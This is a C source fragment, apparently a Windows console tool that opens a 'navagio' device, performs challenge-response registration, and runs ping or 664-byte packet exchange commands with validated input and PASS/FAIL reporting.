    FormatMessageW(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, NULL, error, 0, message, (DWORD)(sizeof(message) / sizeof(message[0])), NULL);
    fprintf(stderr, "FAIL %s: Win32 %lu (0x%08lx)\n", operation, error, error);
    if (message[0]) {
        fwprintf(stderr, L"%ls", message);
    }
    return 1;
}


static int read_packet(const wchar_t* path, navagio_packet* packet) {
    FILE* file = NULL;
    int extra, ok;

    if (_wfopen_s(&file, path, L"rb") || !file) {
        return 0;
    }
    ok = fread(packet->bytes, 1, sizeof(packet->bytes), file) == sizeof(packet->bytes);
    extra = fgetc(file);
    ok = ok && extra == EOF && !ferror(file);
    if (fclose(file)) {
        ok = 0;
    }
    return ok;
}


static int write_packet(const wchar_t* path, const navagio_packet* packet) {
    FILE* file = NULL;
    int ok;

    if (_wfopen_s(&file, path, L"wb") || !file) {
        return 0;
    }
    ok = fwrite(packet->bytes, 1, sizeof(packet->bytes), file) == sizeof(packet->bytes);
    if (fclose(file)) {
        ok = 0;
    }
    return ok;
}

int wmain(int argc, wchar_t** argv) {
    const wchar_t* path = NAVAGIO_DEVICE_PATH;
    const wchar_t* command;
    poc client;
    navagio_packet packet;
    DWORD error;
    unsigned long count = 1, i;
    int pos = 1, result = 0, exchange;

    if (pos < argc && !wcscmp(argv[pos], L"--device")) {
        if (pos + 2 >= argc) {
            usage();
            return 2;
        }
        path = argv[pos + 1];
        pos += 2;
    }

    if (pos == argc || !wcscmp(argv[pos], L"--help")) {
        usage();
        return 0;
    }

    {
        int handled;
        int code = navagio_commands_cli(argc, argv, pos, path, &handled);

        if (handled) {
            return code;
        }
    }

    command = argv[pos++];
    exchange = !wcscmp(command, L"exchange");

    if (!exchange && wcscmp(command, L"ping")) {
        usage();
        return 2;
    }

    if (exchange) {
        if (argc - pos != 2 || !read_packet(argv[pos], &packet)) {
            fputs("exchange requires an input file of exactly 664 bytes and an output path.\n", stderr);
            return 2;
        }
        if (navagio_get_u32(packet.bytes + NAVAGIO_OFF_COMMAND) == NAVAGIO_CMD_REGISTER) {
            fputs("exchange performs registration automatically; command 0xad4 is reserved.\n", stderr);
            return 2;
        }
    }
    else {
        if (pos < argc) {
            wchar_t* end;

            errno = 0;
            count = wcstoul(argv[pos++], &end, 10);
            if (errno || *end || count < 1 || count > 1000) {
                fputs("COUNT must be 1..1000.\n", stderr);
                return 2;
            }
        }
        if (pos != argc) {
            usage();
            return 2;
        }
    }

    error = navagio_open(&client, path);
    if (error) {
        return report_error("CreateFileW", error);
    }
    wprintf(L"PASS open %ls\n", path);

    error = navagio_register(&client);
    if (error) {
        result = report_error("registration reply validation", error);
        goto done;
    }
    printf("PASS register: pid=%lu session=0x%08lx, challenge response validated\n", (unsigned long)client.process_id, (unsigned long)client.session);

    if (exchange) {
        error = navagio_exchange(&client, &packet);
        if (error) {
            result = report_error("exchange", error);
            goto done;
        }
        if (!write_packet(argv[pos + 1], &packet)) {
            fputs("FAIL writing response file.\n", stderr);
            result = 1;
            goto done;
        }

        printf("REPLY command=0x%08lx success=%lu; 664 decoded bytes saved\n", (unsigned long)navagio_get_u32(packet.bytes + NAVAGIO_OFF_COMMAND),
            (unsigned long)navagio_get_u32(packet.bytes + NAVAGIO_OFF_SUCCESS));
        goto done;
    }

    for (i = 0; i < count; ++i) {
        uint32_t challenge, response;

        error = navagio_ping(&client, &challenge, &response);
        if (error) {
            result = report_error("ping reply validation", error);
            goto done;
        }
        printf("PASS ping %lu: challenge=0x%08lx response=0x%08lx (verified)\n", i + 1, (unsigned long)challenge, (unsigned long)response);
    }

done:
    error = navagio_close(&client);
    if (error) {
        result = report_error("CloseHandle", error);
    }
    else if (!result) {
        puts("PASS close");
    }
    return result;
}
